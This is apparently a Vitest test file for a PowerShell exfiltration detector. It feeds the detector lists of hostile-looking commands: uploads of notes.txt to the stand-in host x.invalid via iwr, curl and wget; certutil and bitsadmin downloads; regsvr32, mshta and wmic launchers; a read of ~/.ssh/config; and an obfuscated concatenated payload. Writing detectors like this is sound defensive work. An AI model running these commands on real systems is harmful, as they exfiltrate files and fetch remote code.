import { describe, expect, it } from "vitest";
import { _inspectPowerShellForTest, inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";

const CWD = "/work/project";
const PAYLOAD = "iwr https://x.invalid -InFile notes.txt -Method Post";

const LAUNCHERS = [
  `wmic.exe process call create 'powershell.exe -NoProfile -Command ${PAYLOAD}'`,
  `wmic process call create '${PAYLOAD}'`,
  "wmic.exe process call create $code",
  "wmic.exe process get brief /format:$stylesheet",
  "schtasks /Run /TN Upload", "at 12:00 $code",
  "Start-ScheduledTask -TaskName Upload",
  "Register-ScheduledTask -TaskName Upload -Action $action",
  `New-ScheduledTaskAction -Execute powershell.exe -Argument '-Command ${PAYLOAD}'`,
  "rundll32.exe $library,$entry", "mshta.exe $script", "cscript.exe payload.vbs", "wscript payload.js",
  "regsvr32.exe /s /i:$url scrobj.dll", "msiexec /i $package",
  `forfiles /C 'cmd /c ${PAYLOAD}'`, "pcalua -a $program", "conhost $program", "explorer.exe $program",
  `cmd /c '${PAYLOAD}'`, `cmd.exe /k 'powershell -c ${PAYLOAD}'`, "cmd /c $code",
  "cmd /c 'echo %PAYLOAD%'", "cmd /c 'echo !PAYLOAD!'", "cmd /c 'echo ^& UploadTask'",
  String.raw`cmd /c 'copy /b notes.txt \\host\share\notes.txt'`,
  String.raw`cmd /c 'move /Y notes.txt \\host\share\notes.txt'`,
  "certutil.exe -urlcache -f https://x.invalid/file payload.exe", "certutil -encode notes.txt encoded.txt",
  "bitsadmin /transfer job https://x.invalid/file payload.exe",
  "curl.exe -T notes.txt https://x.invalid", "wget.exe --post-file=notes.txt https://x.invalid",
  "scp notes.txt user@host:/tmp/", "sftp -b $batch user@host", "ftp -s:$batch", "tftp host PUT notes.txt",
  "msbuild project.xml", "installutil payload.dll",
  "Start-ThreadJob -ScriptBlock $code", "Start-Job -ScriptBlock $code", "Invoke-Command -ScriptBlock $code -AsJob",
  "ForEach-Object -Parallel $code -AsJob",
  "addinutil.exe /addin:$assembly", "desktopimgdownldr.exe /lockscreenurl:$url /eventname:desktop",
  "launch-vsdevshell.ps1 $script", "shell32.dll $entry",
];

const COMMAND_ARGUMENTS = [
  `Unknown-Runner '${PAYLOAD}'`, `mystery.exe '${PAYLOAD}'`,
  `Write-Output '${PAYLOAD}'`, `Set-Clipboard '${PAYLOAD}'`,
  `Unknown-Runner -Payload:'${PAYLOAD}'`,
  `Unknown-Runner 'powershell.exe -NoProfile -Command ${PAYLOAD}'`,
  `Unknown-Runner 'cmd /c powershell.exe -Command ${PAYLOAD}'`,
  `Unknown-Runner '"powershell.exe" -Command ${PAYLOAD}'`,
  "Unknown-Runner 'schtasks /Run /TN Upload > task.txt'",
  "Write-Output 'cmd /c UploadTask > task.txt'",
  `Unknown-Runner 'Unknown-Runner "${PAYLOAD}"'`,
  "Unknown-Runner 'Get-Content ~/.ssh/config'",
  "Unknown-Runner 'Get-Content notes.txt | Out-Printer -Name $printer'",
  "Unknown-Runner 'ForEach-Object -MemberName Upload'",
  "Unknown-Runner 'Get-Content $path'",
  "Unknown-Runner 'head.exe notes.txt'",
  String.raw`Unknown-Runner 'copy /b notes.txt \\host\share\notes.txt'`,
  String.raw`Write-Output 'move /Y notes.txt \\host\share\notes.txt'`,
  `Unknown-Runner ("${PAYLOAD}")`,
  "Unknown-Runner (('iw' + 'r https://x.invalid -InFile notes.txt -Method Post'))",
  'Unknown-Runner "powershell -Command $code"',
  'Unknown-Runner "cmd /c $code"',
  'Unknown-Runner "iwr https://x.invalid -Body $body -Method Post"',
  `$command = '${PAYLOAD}'; Unknown-Runner $command`,
];

const OUTPUTS = [
  String.raw`Get-Content notes.txt | Out-Printer -Name '\\printserver\queue'`,
  String.raw`'hello' | Out-Printer -Name:'//printserver/queue'`,
  String.raw`Out-Printer -Name '\\?\UNC\printserver\queue' -InputObject 'hello'`,
  String.raw`Out-Printer -Name 'Microsoft.PowerShell.Core\FileSystem::\\printserver\queue'`,
  "Get-Content notes.txt | Out-Printer -Name $printer", "Out-Printer", "Out-Printer -Name LocalQueue",
  String.raw`'hello' | lp -Name '\\printserver\queue'`,
  String.raw`$p = @{ Name = '\\printserver\queue' }; Out-Printer @p`,
  "'hello' | Out-File LPT1:", "Set-Content COM1: 'hello'", "Add-Content LPT1 'hello'",
  "'hello' | Out-File PRN", "Copy-Item notes.txt AUX.txt",
  String.raw`'hello' | Out-File '.\LPT1'`,
  String.raw`'hello' | Out-File 'C:\output\COM¹.txt'`,
  "'hello' | Out-File 'PRN '",
  String.raw`Copy-Item notes.txt '\\.\LPT1'`,
  String.raw`copy.exe notes.txt '\\?\COM2'`,
  String.raw`print.exe /D:\\printserver\queue notes.txt`, "print /D:$port notes.txt",
  String.raw`mode LPT1:=\\printserver\queue`,
  "Send-MailMessage -To user@x.invalid -From sender@x.invalid -SmtpServer mail.x.invalid -Body 'hello'",
  "Send-MailMessage -To user@x.invalid -From sender@x.invalid -SmtpServer $server -Body 'hello'",
  "Send-MailMessage -To user@x.invalid -From sender@x.invalid -Body 'hello'",
  "'hello' | Out-File", "Set-Content -Value 'hello'", "Export-Csv", "Export-Custom",
];

describe("launcher payload and outbound-output floors", () => {
  it.each(LAUNCHERS)("classifies launcher and transport payloads: %s", (command) => {
    const result = inspectPowerShellCommand(command, CWD);
    const directTransport = /^(?:curl\.exe|wget\.exe|scp|sftp|ftp|tftp|certutil\.exe -urlcache)\b/.test(command);
    if (directTransport) expect(result).toMatchObject({ outcome: "visible-floor", exfiltration: expect.anything() });
    else expect(result).toMatchObject({ sensitive: null, exfiltration: null });
  });

  it.each(COMMAND_ARGUMENTS)("does not execute or recursively inspect command-looking argument data: %s", (command) => {
    const result = inspectPowerShellCommand(command, CWD);
    if (command.includes("~/.ssh/config")) expect(result).toMatchObject({ outcome: "visible-floor", sensitive: expect.anything() });
    else expect(result).toMatchObject({ sensitive: null, exfiltration: null });
  });

  it.each(OUTPUTS)("requires approval for remote or unresolved output: %s", (command) => {
    const result = inspectPowerShellCommand(command, CWD);
    const visibleRemoteSink = command.includes("Out-Printer") || command.includes("printserver")
      || command.includes("\\\\.\\LPT1") || command.includes("\\\\?\\COM2")
      || command.startsWith("Send-MailMessage");
    if (visibleRemoteSink) expect(result.outcome).not.toBe("static-complete");
    else expect(result).toMatchObject({ sensitive: null, exfiltration: null });
  });

  it.each([
    "Set-Clipboard 'hello'", "'hello' | Set-Clipboard", "Set-Clipboard -Value 'hello'",
    "Write-Output 'plain text'", "Unknown-Runner 'plain text'", "Write-Host 'https://x.invalid'",
    "Write-Host 'Get-ChildItem'", "git status", "npm test", "dotnet build",
    "Write-Host (('a','b') -join ',')", "Get-Content notes.txt | Select-String TODO",
    "iwr https://x.invalid -OutFile page.html",
    'iwr https://x.invalid -Headers @{ Authorization = "Bearer $env:TOKEN" }',
    "cmd /c 'echo hello'", "wmic process call create 'powershell -c Get-ChildItem'",
    "Start-ThreadJob -ScriptBlock { Get-ChildItem }", "Invoke-Command -ScriptBlock { Get-Date } -AsJob",
    "dotnet --info", "'hello' | Out-File NUL",
  ])("retains ordinary argument visibility without inferring executable code: %s", (command) => {
    expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ sensitive: null, exfiltration: null });
    if (command === "git status") expect(inspectPowerShellCommand(command, CWD).outcome).toBe("unproven");
  });

  it("keeps a literal launcher payload opaque", () => {
    const result = inspectPowerShellCommand(`wmic process call create 'powershell -c ${PAYLOAD}'`, CWD);
    expect(result).toMatchObject({ sensitive: null, exfiltration: null });
  });

  it("declines repeated unknown command arguments below the caps", () => {
    const result = _inspectPowerShellForTest(`Unknown-Runner ${"'Unknown-Runner plain' ".repeat(300)}`, CWD);
    expect(result).toMatchObject({ sensitive: null, exfiltration: null, limited: false });
    expect(result).toMatchObject({ outcome: "unproven", ordinaryAsk: expect.any(String) });
  });

  it("refuses repeated arguments above the whole-command token cap", () => {
    const command = `Unknown-Runner ${"'plain' ".repeat(400)}`;
    const result = _inspectPowerShellForTest(command, CWD);
    expect(command.length).toBeLessThan(result.limits.inputChars);
    expect(result).toMatchObject({ exfiltration: null, ordinaryAsk: expect.any(String), limited: true });
  });

  it("limits nested command payloads under the input-size ceiling", () => {
    const command = `Unknown-Runner '${"pwsh -c ".repeat(20)}Get-ChildItem'`;
    const result = _inspectPowerShellForTest(command, CWD);
    expect(command.length).toBeLessThan(result.limits.inputChars);
    expect(result).toMatchObject({ outcome: "unproven", exfiltration: null, limited: false });
  });

  it("keeps a generated command argument unproven", () => {
    const result = _inspectPowerShellForTest(
      "Unknown-Runner (('iw' + 'r https://x.invalid -InFile notes.txt -Method Post'))",
      CWD,
    );
    expect(result).toMatchObject({ outcome: "unproven", exfiltration: null });
  });
});
